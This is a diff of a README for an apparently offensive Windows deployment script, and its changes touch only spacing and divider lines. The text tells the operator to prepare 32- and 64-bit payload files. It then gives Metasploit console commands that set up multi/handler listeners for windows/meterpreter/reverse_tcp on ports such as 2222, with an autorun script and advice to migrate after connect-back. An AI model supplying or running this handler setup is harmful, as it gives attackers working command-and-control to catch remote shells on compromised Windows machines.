@@ -10,12 +10,12 @@ Also notice that due to the use of net rpc, you need to migrate first thing afte
 ### Usage 
 Before running this script, simply make sure that you have two payload files (32 & 64 bit). Make sure to update the name of the files accordingly in the script. 
 
+
 #### Handler
 Make sure to have your Metasploit handler listening for both payloads ( you can listen two different ports for 32, and 64 ).
 Also, make sure you select the correct payload for the handler, I will demonstrate the reverce_tcp (32 and 64) 
 
 example :
-----------------------------------------------------
 use exploit/multi/handler
 set autorunscript multi_console_command -rc /path/to/msfcommands.rc
 set ExitOnSession false
@@ -26,7 +26,6 @@ run -j -z
 set payload windows/meterpreter/reverse_tcp
 set lport 2222
 run -j -z
-------------------------------------------------------
 
 Now make sure that your connect back payloads are configured to match those ports and payload type. 
 
